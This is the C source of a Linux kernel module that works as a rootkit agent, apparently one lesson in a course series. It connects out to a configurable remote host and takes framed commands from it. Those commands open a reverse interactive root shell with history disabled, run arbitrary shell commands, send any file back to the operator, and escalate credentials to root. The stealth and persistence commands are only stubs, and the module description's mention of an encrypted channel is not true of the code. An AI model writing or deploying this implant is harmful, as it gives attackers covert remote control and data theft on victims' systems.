// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/uio.h>
#include <linux/workqueue.h>
#include <net/net_namespace.h>

#define RK_CMD_MAX	256
#define RK_ARG_MAX	128
#define RK_CHUNK_SIZE	4096
#define RK_TIMEOUT_SEC	60
#define RK_FRAME_MAX	4096

/* ------------------------------------------------------------------ */
/* Module parameters                                                   */
/* ------------------------------------------------------------------ */

static unsigned short peer_port;
module_param(peer_port, ushort, 0);

static char peer_addr_str[16] = "127.0.0.1";
module_param_string(peer_address, peer_addr_str, sizeof(peer_addr_str), 0);

/* ------------------------------------------------------------------ */
/* Command protocol (from L24)                                         */
/* ------------------------------------------------------------------ */

enum rk_cmd_kind {
	RK_CMD_PING,
	RK_CMD_STATUS,
	RK_CMD_SHELL,
	RK_CMD_EXEC,
	RK_CMD_DOWNLOAD,
	RK_CMD_HIDE_FILE,
	RK_CMD_UNHIDE_FILE,
	RK_CMD_HIDE_PID,
	RK_CMD_UNHIDE_PID,
	RK_CMD_HIDE_CONTENT,
	RK_CMD_UNHIDE_CONTENT,
	RK_CMD_HIDE_PORT,
	RK_CMD_UNHIDE_PORT,
	RK_CMD_PERSIST,
	RK_CMD_UNPERSIST,
	RK_CMD_ESCALATE,
	RK_CMD_INFO,
	RK_CMD_LIST,
	RK_CMD_UNKNOWN,
};

struct rk_command {
	enum rk_cmd_kind kind;
	char arg[RK_ARG_MAX];
};

static void rk_copy_arg(struct rk_command *cmd, const char *src, size_t len)
{
	if (len >= RK_ARG_MAX)
		len = RK_ARG_MAX - 1;
	memcpy(cmd->arg, src, len);
	cmd->arg[len] = '\0';
}

static size_t rk_strip(const char *buf, size_t len)
{
	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
			   buf[len - 1] == ' '))
		len--;
	return len;
}

static bool rk_prefix(const char *buf, size_t len, const char *pfx,
		       size_t plen)
{
	return len >= plen && memcmp(buf, pfx, plen) == 0;
}

static bool rk_exact(const char *buf, size_t len, const char *word)
{
	size_t wlen = strlen(word);

	return len == wlen && memcmp(buf, word, wlen) == 0;
}

static int rk_command_parse(const char *buf, size_t len,
			     struct rk_command *cmd)
{
	cmd->kind = RK_CMD_UNKNOWN;
	cmd->arg[0] = '\0';

	len = rk_strip(buf, len);
	if (!len)
		return -EINVAL;

	if (rk_prefix(buf, len, "HIDE FILE ", 10)) {
		cmd->kind = RK_CMD_HIDE_FILE;
		rk_copy_arg(cmd, buf + 10, len - 10);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE FILE ", 12)) {
		cmd->kind = RK_CMD_UNHIDE_FILE;
		rk_copy_arg(cmd, buf + 12, len - 12);
		return 0;
	}
	if (rk_prefix(buf, len, "HIDE PID ", 9)) {
		cmd->kind = RK_CMD_HIDE_PID;
		rk_copy_arg(cmd, buf + 9, len - 9);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE PID ", 11)) {
		cmd->kind = RK_CMD_UNHIDE_PID;
		rk_copy_arg(cmd, buf + 11, len - 11);
		return 0;
	}
	if (rk_prefix(buf, len, "HIDE CONTENT ", 13)) {
		cmd->kind = RK_CMD_HIDE_CONTENT;
		rk_copy_arg(cmd, buf + 13, len - 13);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE CONTENT ", 15)) {
		cmd->kind = RK_CMD_UNHIDE_CONTENT;
		rk_copy_arg(cmd, buf + 15, len - 15);
		return 0;
	}
	if (rk_prefix(buf, len, "HIDE PORT ", 10)) {
		cmd->kind = RK_CMD_HIDE_PORT;
		rk_copy_arg(cmd, buf + 10, len - 10);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE PORT ", 12)) {
		cmd->kind = RK_CMD_UNHIDE_PORT;
		rk_copy_arg(cmd, buf + 12, len - 12);
		return 0;
	}
	if (rk_prefix(buf, len, "EXEC ", 5)) {
		cmd->kind = RK_CMD_EXEC;
		rk_copy_arg(cmd, buf + 5, len - 5);
		return 0;
	}
	if (rk_prefix(buf, len, "DOWNLOAD ", 9)) {
		cmd->kind = RK_CMD_DOWNLOAD;
		rk_copy_arg(cmd, buf + 9, len - 9);
		return 0;
	}
	if (rk_prefix(buf, len, "LIST ", 5)) {
		cmd->kind = RK_CMD_LIST;
		rk_copy_arg(cmd, buf + 5, len - 5);
		return 0;
	}
	if (rk_exact(buf, len, "PING")) {
		cmd->kind = RK_CMD_PING;
		return 0;
	}
	if (rk_exact(buf, len, "STATUS")) {
		cmd->kind = RK_CMD_STATUS;
		return 0;
	}
	if (rk_exact(buf, len, "SHELL")) {
		cmd->kind = RK_CMD_SHELL;
		return 0;
	}
	if (rk_exact(buf, len, "PERSIST")) {
		cmd->kind = RK_CMD_PERSIST;
		return 0;
	}
	if (rk_exact(buf, len, "UNPERSIST")) {
		cmd->kind = RK_CMD_UNPERSIST;
		return 0;
	}
	if (rk_exact(buf, len, "ESCALATE")) {
		cmd->kind = RK_CMD_ESCALATE;
		return 0;
	}
	if (rk_exact(buf, len, "INFO")) {
		cmd->kind = RK_CMD_INFO;
		return 0;
	}

	return 0;
}

/* ------------------------------------------------------------------ */
/* Socket helpers                                                      */
/* ------------------------------------------------------------------ */

static struct socket *rk_connect(void)
{
	struct sockaddr_in peer = {
		.sin_family = AF_INET,
		.sin_port = htons(peer_port),
	};
	struct socket *sock;
	int error;

	peer.sin_addr.s_addr = in_aton(peer_addr_str);

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
				 IPPROTO_TCP, &sock);
	if (error)
		return ERR_PTR(error);

	error = kernel_connect(sock, (struct sockaddr *)&peer,
			       sizeof(peer), 0);
	if (error) {
		sock_release(sock);
		return ERR_PTR(error);
	}

	return sock;
}

static int rk_send_all(struct socket *sock, const void *buf, size_t len)
{
	size_t offset = 0;

	while (offset < len) {
		struct msghdr msg = { };
		struct kvec vec = {
			.iov_base = (void *)buf + offset,
			.iov_len = len - offset,
		};
		ssize_t sent;

		sent = kernel_sendmsg(sock, &msg, &vec, 1, len - offset);
		if (sent < 0)
			return (int)sent;
		if (!sent)
			return -EPIPE;
		offset += sent;
	}

	return 0;
}

static int rk_recv_all(struct socket *sock, void *buf, size_t len)
{
	size_t offset = 0;

	while (offset < len) {
		struct msghdr msg = { };
		struct kvec vec = {
			.iov_base = buf + offset,
			.iov_len = len - offset,
		};
		ssize_t got;

		got = kernel_recvmsg(sock, &msg, &vec, 1, len - offset, 0);
		if (got < 0)
			return (int)got;
		if (!got)
			return -ECONNRESET;
		offset += got;
	}

	return 0;
}

/* Send a length-prefixed frame. */
static int rk_send_frame(struct socket *sock, const void *data, u32 len)
{
	__be32 hdr = htonl(len);
	int error;

	error = rk_send_all(sock, &hdr, sizeof(hdr));
	if (error)
		return error;

	if (len > 0)
		error = rk_send_all(sock, data, len);

	return error;
}

/* Receive a length-prefixed frame. Caller must kfree(*out). */
static int rk_recv_frame(struct socket *sock, char **out, u32 *out_len)
{
	__be32 hdr;
	u32 len;
	char *buf;
	int error;

	error = rk_recv_all(sock, &hdr, sizeof(hdr));
	if (error)
		return error;

	len = ntohl(hdr);
	if (len > RK_FRAME_MAX)
		return -EMSGSIZE;

	if (len == 0) {
		*out = NULL;
		*out_len = 0;
		return 0;
	}

	buf = kmalloc(len + 1, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	error = rk_recv_all(sock, buf, len);
	if (error) {
		kfree(buf);
		return error;
	}

	/* Null-terminate for safe string operations. */
	buf[len] = '\0';
	*out = buf;
	*out_len = len;
	return 0;
}

/* ------------------------------------------------------------------ */
/* Shell with timeout (from L22)                                       */
/* ------------------------------------------------------------------ */

struct rk_shell {
	struct mutex		lock;
	bool			busy;
	struct socket		*sock;
	struct file		*file;
	struct delayed_work	timeout_work;
	unsigned long		timeout_jiffies;
	char			cmd[RK_CMD_MAX];
};

static struct rk_shell interactive_shell;
static struct rk_shell exec_shell;

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

static void rk_shell_timeout_fn(struct work_struct *work)
{
	struct rk_shell *shell = container_of(
		to_delayed_work(work), struct rk_shell, timeout_work);

	mutex_lock(&shell->lock);
	if (shell->busy && shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
}

static void rk_shell_init(struct rk_shell *shell)
{
	mutex_init(&shell->lock);
	shell->busy = false;
	shell->sock = NULL;
	shell->file = NULL;
	shell->timeout_jiffies = RK_TIMEOUT_SEC * HZ;
	shell->cmd[0] = '\0';
	INIT_DELAYED_WORK(&shell->timeout_work, rk_shell_timeout_fn);
}

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

static int rk_shell_init_fn(struct subprocess_info *info,
			     struct cred *new)
{
	struct rk_shell *shell = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!shell->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(shell->file, fd);
		if (error)
			return error;
	}
	return 0;
}

static int rk_shell_make_file(struct rk_shell *shell)
{
	struct file *file;

	file = sock_alloc_file(shell->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	shell->file = file;
	return 0;
}

static void rk_shell_release(struct rk_shell *shell)
{
	cancel_delayed_work_sync(&shell->timeout_work);

	if (shell->file) {
		fput(shell->file);
		shell->file = NULL;
		shell->sock = NULL;
	} else if (shell->sock) {
		sock_release(shell->sock);
		shell->sock = NULL;
	}
}

static void rk_interactive_work(struct work_struct *work)
{
	struct rk_shell *shell = &interactive_shell;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-i", NULL };
	struct socket *sock;

	sock = rk_connect();
	if (IS_ERR(sock))
		goto out;
	shell->sock = sock;

	if (rk_shell_make_file(shell))
		goto out;

	mod_delayed_work(system_wq, &shell->timeout_work,
			 shell->timeout_jiffies);

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, shell);
	if (!sub)
		goto out;

	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	mutex_unlock(&shell->lock);
}

static void rk_exec_work(struct work_struct *work)
{
	struct rk_shell *shell = &exec_shell;
	struct subprocess_info *sub;
	char *argv[] = { "/bin/sh", "-c", shell->cmd, NULL };
	struct socket *sock;

	sock = rk_connect();
	if (IS_ERR(sock))
		goto out;
	shell->sock = sock;

	if (rk_shell_make_file(shell))
		goto out;

	mod_delayed_work(system_wq, &shell->timeout_work,
			 shell->timeout_jiffies);

	sub = call_usermodehelper_setup("/bin/sh", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn,
					NULL, shell);
	if (!sub)
		goto out;

	call_usermodehelper_exec(sub, UMH_WAIT_PROC);

out:
	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	shell->cmd[0] = '\0';
	mutex_unlock(&shell->lock);
}

static DECLARE_WORK(interactive_work_item, rk_interactive_work);
static DECLARE_WORK(exec_work_item, rk_exec_work);

static int rk_start_interactive(void)
{
	int error = 0;

	mutex_lock(&interactive_shell.lock);
	if (interactive_shell.busy) {
		error = -EBUSY;
	} else {
		interactive_shell.busy = true;
		schedule_work(&interactive_work_item);
	}
	mutex_unlock(&interactive_shell.lock);
	return error;
}

static int rk_start_exec(const char *cmd)
{
	size_t len;
	int error = 0;

	if (!cmd || !*cmd)
		return -EINVAL;
	len = strlen(cmd);
	if (len >= RK_CMD_MAX)
		return -E2BIG;

	mutex_lock(&exec_shell.lock);
	if (exec_shell.busy) {
		error = -EBUSY;
	} else {
		exec_shell.busy = true;
		memcpy(exec_shell.cmd, cmd, len + 1);
		schedule_work(&exec_work_item);
	}
	mutex_unlock(&exec_shell.lock);
	return error;
}

static void rk_shell_stop(struct rk_shell *shell)
{
	mutex_lock(&shell->lock);
	if (shell->sock)
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	mutex_unlock(&shell->lock);
	cancel_delayed_work_sync(&shell->timeout_work);
}

/* ------------------------------------------------------------------ */
/* File download (from L23)                                            */
/* ------------------------------------------------------------------ */

static int rk_download_file(struct socket *sock, const char *filepath)
{
	struct file *f;
	char *buf;
	loff_t pos = 0;
	int error = 0;

	f = filp_open(filepath, O_RDONLY, 0);
	if (IS_ERR(f)) {
		__be32 err_val = htonl((u32)PTR_ERR(f));

		rk_send_frame(sock, &err_val, sizeof(err_val));
		return PTR_ERR(f);
	}

	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
	if (!buf) {
		filp_close(f, NULL);
		return -ENOMEM;
	}

	for (;;) {
		ssize_t bytes_read;

		bytes_read = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);
		if (bytes_read < 0) {
			error = (int)bytes_read;
			break;
		}
		if (bytes_read == 0)
			break;

		error = rk_send_frame(sock, buf, (u32)bytes_read);
		if (error)
			break;
	}

	if (!error)
		error = rk_send_frame(sock, NULL, 0);

	kfree(buf);
	filp_close(f, NULL);
	return error;
}

/* ------------------------------------------------------------------ */
/* Privilege escalation                                                */
/* ------------------------------------------------------------------ */

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

/* ------------------------------------------------------------------ */
/* Command dispatch                                                    */
/* ------------------------------------------------------------------ */

static int rk_send_response(struct socket *sock, const char *resp)
{
	return rk_send_frame(sock, resp, strlen(resp));
}

static int rk_command_dispatch(struct socket *sock, struct rk_command *cmd)
{
	switch (cmd->kind) {
	case RK_CMD_PING:
		return rk_send_response(sock, "PONG");
	case RK_CMD_STATUS:
		return rk_send_response(sock, "OK");
	case RK_CMD_SHELL:
		rk_start_interactive();
		return rk_send_response(sock, "SHELL OK");
	case RK_CMD_EXEC:
		rk_start_exec(cmd->arg);
		return rk_send_response(sock, "EXEC OK");
	case RK_CMD_DOWNLOAD:
		return rk_download_file(sock, cmd->arg);
	case RK_CMD_HIDE_FILE:
		return rk_send_response(sock, "HIDE FILE OK");
	case RK_CMD_UNHIDE_FILE:
		return rk_send_response(sock, "UNHIDE FILE OK");
	case RK_CMD_HIDE_PID:
		return rk_send_response(sock, "HIDE PID OK");
	case RK_CMD_UNHIDE_PID:
		return rk_send_response(sock, "UNHIDE PID OK");
	case RK_CMD_HIDE_CONTENT:
		return rk_send_response(sock, "HIDE CONTENT OK");
	case RK_CMD_UNHIDE_CONTENT:
		return rk_send_response(sock, "UNHIDE CONTENT OK");
	case RK_CMD_HIDE_PORT:
		return rk_send_response(sock, "HIDE PORT OK");
	case RK_CMD_UNHIDE_PORT:
		return rk_send_response(sock, "UNHIDE PORT OK");
	case RK_CMD_PERSIST:
		return rk_send_response(sock, "PERSIST OK");
	case RK_CMD_UNPERSIST:
		return rk_send_response(sock, "UNPERSIST OK");
	case RK_CMD_ESCALATE:
		rk_escalate();
		return rk_send_response(sock, "ESCALATE OK");
	case RK_CMD_INFO:
		return rk_send_response(sock, "INFO OK");
	case RK_CMD_LIST:
		return rk_send_response(sock, "LIST OK");
	case RK_CMD_UNKNOWN:
		return rk_send_response(sock, "ERR unknown command");
	}
	return -EINVAL;
}

/* ------------------------------------------------------------------ */
/* Agent kthread loop                                                  */
/* ------------------------------------------------------------------ */

static struct task_struct *agent_thread;
static struct socket *agent_sock;

static int rk_agent_fn(void *data)
{
	struct socket *sock = data;
	char *frame;
	u32 frame_len;
	int error;

	while (!kthread_should_stop()) {
		struct rk_command cmd;

		error = rk_recv_frame(sock, &frame, &frame_len);
		if (error)
			break;

		if (!frame)
			continue;

		error = rk_command_parse(frame, frame_len, &cmd);
		kfree(frame);

		if (error)
			continue;

		error = rk_command_dispatch(sock, &cmd);
		if (error)
			break;
	}

	return 0;
}

/* ------------------------------------------------------------------ */
/* Module lifecycle                                                    */
/* ------------------------------------------------------------------ */

static int __init rk_init(void)
{
	struct socket *sock;

	if (!peer_port)
		return -EINVAL;

	rk_shell_init(&interactive_shell);
	rk_shell_init(&exec_shell);

	sock = rk_connect();
	if (IS_ERR(sock))
		return PTR_ERR(sock);

	agent_sock = sock;

	agent_thread = kthread_run(rk_agent_fn, sock, "rk_agent");
	if (IS_ERR(agent_thread)) {
		int error = PTR_ERR(agent_thread);

		agent_thread = NULL;
		kernel_sock_shutdown(sock, SHUT_RDWR);
		sock_release(sock);
		agent_sock = NULL;
		return error;
	}

	return 0;
}

static void __exit rk_exit(void)
{
	if (agent_sock)
		kernel_sock_shutdown(agent_sock, SHUT_RDWR);

	if (agent_thread)
		kthread_stop(agent_thread);

	if (agent_sock) {
		sock_release(agent_sock);
		agent_sock = NULL;
	}

	rk_shell_stop(&interactive_shell);
	rk_shell_stop(&exec_shell);
	cancel_work_sync(&interactive_work_item);
	cancel_work_sync(&exec_work_item);
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Remote control protocol over encrypted channel");
